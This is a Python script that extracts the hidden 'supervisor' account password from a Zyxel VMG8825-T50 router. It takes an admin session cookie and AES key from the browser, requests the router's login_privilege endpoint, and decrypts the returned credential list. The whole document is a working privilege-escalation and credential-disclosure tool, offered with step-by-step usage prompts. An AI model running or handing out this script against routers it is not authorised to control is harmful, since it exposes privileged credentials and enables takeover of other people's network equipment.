#!/usr/bin/python3
import json, requests
from Crypto.Cipher import AES
from base64 import b64decode
from Crypto.Util.Padding import unpad

def get_supervisor_password (ip, aes_key, session_key):
    aes_key = aes_key
    cookies = {
        "_TESTCOOKIESUPPORT": "1",
        "Session": session_key
    }
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "nl,en-US;q=0.7,en;q=0.3",
        "Connection": "keep-alive",
        "Host": ip,
        "If-Modified-Since": "Thu, 01 Jun 1970 00:00:00 GMT",
        "Referer": f"http://{ip}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
        "X-Requested-With": "XMLHttpRequest"
    }

    response = requests.get(f"http://{ip}/cgi-bin/DAL?oid=login_privilege", cookies=cookies, headers=headers).json()
    ct = b64decode(response["content"])
    iv = b64decode(response["iv"])
    key = b64decode(aes_key)
    cipher = AES.new(key, AES.MODE_CBC, iv[:16])
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    data = json.loads(pt)
    for object in data["Object"]:
        if object["Username"] == "supervisor":
            return object["Password"]
    #print(json.dumps(data, indent=4, sort_keys=True))

print("Retrieve supervisor password for Zyxel VMG8825-T50")
print("First, login to the device (with the default admin account) using Firefox")
print()
print("In the Firefox, press F12 and go Storage")
print("Take note of the Session key under cookies")
print("Take note of the AesKey under Local Storage")
print()
print("Notice: you need to run this script from the\nsame IP as from where you started the browser")
print()
ip = str(input("Zyxel IP-adress (192.168.2.254 by default):")) or "192.168.2.254"
session_key = str(input("Session:"))
aes_key = str(input("AesKey:"))
print()
print(f"Supervisor password: {get_supervisor_password(ip, aes_key, session_key)}")
